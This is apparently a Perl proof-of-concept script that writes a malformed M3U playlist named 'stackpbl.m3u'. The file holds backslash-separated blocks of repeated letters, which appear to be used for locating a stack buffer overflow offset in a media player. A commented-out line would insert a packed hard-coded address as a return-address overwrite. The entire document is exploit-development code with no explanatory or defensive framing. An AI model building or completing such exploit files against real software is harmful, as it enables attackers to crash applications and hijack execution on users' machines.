$file= "stackpbl.m3u";
$buffer ="\\";
$buffer .="A" x 50;
$buffer .="\\";
$buffer .="B" x 50;
$buffer .="\\";
$buffer .="C" x 50;
$buffer .="\\";
$buffer .="D" x 50;
$buffer .="\\";
$buffer .="E" x 50;
$buffer .="\\";
$buffer .="F" x 50;
$buffer .="\\";
$buffer .="G" x 50;
$buffer .="\\";
$buffer .="G" x 50;
$buffer .="\\";
$buffer .="G" x 50;
$buffer .="\\";
$buffer .="H" x 50;
$buffer .="\\";
$buffer .="I" x 50;
#$buffer .= pack('V',0x7E429353);

open($FILE,">$file");
print $FILE $buffer;
close($FILE);